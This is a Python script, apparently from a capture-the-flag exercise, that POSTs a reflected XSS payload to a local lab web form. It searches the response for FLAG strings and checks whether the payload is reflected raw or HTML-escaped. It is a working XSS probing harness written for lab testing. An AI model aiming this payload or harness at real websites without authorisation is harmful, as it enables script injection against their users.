import requests
import re

# Try POST instead - the form suggests it expects POST
url = "http://127.0.0.1:33203/page"
payload = "<img src=x onerror=alert('XSS')>"

data = {"name": payload}

print(f"[+] POSTing to: {url}")
print(f"[+] Data: {data}")

response = requests.post(url, data=data)

print(f"[+] Response Status Code: {response.status_code}")
print(f"[+] Response Headers:\n{dict(response.headers)}")
print(f"[+] Response Body (Full):\n{'='*80}")
print(response.text)
print(f"\n{'='*80}")

# Search for FLAG{ patterns
flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
print(f"\n[+] FLAG Search Results:")
if flag_matches:
    for i, flag in enumerate(flag_matches, 1):
        print(f"[!] FLAG FOUND #{i}: {flag}")
else:
    print("[-] No FLAG{ pattern found in response")

# Look for payload reflection
print(f"\n[+] Payload Reflection Analysis:")
if payload in response.text:
    print(f"[!] XSS payload is reflected in response - potential XSS vulnerability!")
    
    # Find all locations
    for match in re.finditer(re.escape(payload), response.text):
        context_start = max(0, match.start() - 100)
        context_end = min(len(response.text), match.end() + 100)
        context = response.text[context_start:context_end]
        print(f"\n[!] Context around reflection:")
        print(f"    Position {match.start()}-{match.end()}")
        print(f"    Context:\n    {context}")
else:
    print("[-] Payload does not appear to be reflected")

# Search for escaped/cleaned version
escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")
if escaped_payload in response.text:
    print(f"[!] Payload appears but is HTML-escaped (likely safe from XSS)")
    print(f"    Escaped version found")
    
    # Show context
    for match in re.finditer(re.escape(escaped_payload), response.text):
        context_start = max(0, match.start() - 100)
        context_end = min(len(response.text), match.end() + 100)
        context = response.text[context_start:context_end]
        print(f"\n[!] Context around escaped payload:")
        print(f"    {context}")
